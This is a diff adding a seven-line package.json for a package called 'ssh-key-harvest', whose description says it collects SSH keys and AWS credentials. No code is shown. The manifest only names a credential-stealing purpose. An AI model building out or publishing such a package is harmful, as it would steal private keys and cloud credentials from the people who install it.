@@ -1,0 +1,7 @@
+{
+  "name": "ssh-key-harvest",
+  "version": "1.0.0",
+  "description": "Collects SSH keys and AWS creds",
+  "main": "index.js",
+  "license": "MIT"
+}
